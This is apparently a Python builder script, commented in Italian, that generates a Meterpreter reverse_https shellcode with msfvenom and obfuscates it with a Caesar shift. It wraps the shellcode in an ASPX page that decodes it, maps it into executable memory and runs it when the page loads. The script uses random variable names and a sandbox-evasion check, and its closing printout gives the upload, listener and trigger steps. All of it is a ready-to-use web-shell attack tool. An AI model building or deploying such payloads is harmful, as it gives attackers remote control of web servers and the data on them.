#!/usr/bin/env python3
"""
Use: sudo python3 build_aspx2.py
Output: ./payload.aspx
"""

import subprocess
import sys
import os
import random
import string

# ── CONFIG ──────────────────────────────────────────────────────
LHOST    = "192.168.x.x"
LPORT    = "x"
SC_TMP   = "/tmp/sc_raw.bin"
OUT_ASPX = "./payload.aspx"
# ────────────────────────────────────────────────────────────────

def rand_var(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

print("[*] Generazione shellcode msfvenom (reverse_https)...")
cmd = [
    "msfvenom",
    "-p", "windows/x64/meterpreter/reverse_https",
    f"LHOST={LHOST}",
    f"LPORT={LPORT}",
    "-f", "raw",
    "-o", SC_TMP
]
r = subprocess.run(cmd, capture_output=True, text=True)
if r.returncode != 0:
    print(f"[-] msfvenom fallito:\n{r.stderr}")
    sys.exit(1)

with open(SC_TMP, "rb") as f:
    sc = f.read()
print(f"[+] Shellcode: {len(sc)} bytes")

# Caesar +5
encoded = bytes(((b + 5) & 0xFF) for b in sc)

# Formatta come array C# con nomi variabili casuali
buf_name  = rand_var()
enc_name  = rand_var()
mem_name  = rand_var()
thr_name  = rand_var()
th_name   = rand_var()
proc_name = rand_var()

arr = ", ".join(f"0x{b:02x}" for b in encoded)

aspx = f"""<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">

    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {{
        IntPtr {mem_name} = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if ({mem_name} == null) {{ return; }}

        byte[] {buf_name} = new byte[{len(encoded)}] {{ {arr} }};

        byte[] {enc_name} = new byte[{buf_name}.Length];
        for (int i = 0; i < {buf_name}.Length; i++)
        {{
            {enc_name}[i] = (byte)(((uint){buf_name}[i] - 5) & 0xFF);
        }}

        IntPtr {thr_name} = VirtualAlloc(IntPtr.Zero, (UIntPtr){enc_name}.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy({enc_name}, 0, {thr_name}, {enc_name}.Length);
        IntPtr {th_name} = IntPtr.Zero;
        IntPtr {proc_name} = CreateThread(IntPtr.Zero, UIntPtr.Zero, {thr_name}, IntPtr.Zero, 0, ref {th_name});
    }}
</script>
<html><body></body></html>
"""

with open(OUT_ASPX, "w") as f:
    f.write(aspx)

print(f"""
[+] Done! File: {OUT_ASPX}

1. Upload payload.asp
2. listener:
   msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST {LHOST}; set LPORT {LPORT}; set EXITFUNC thread; run"

3. Triggera navigando su:
   http://<TARGET-IP>/<path>/payload.aspx
""")
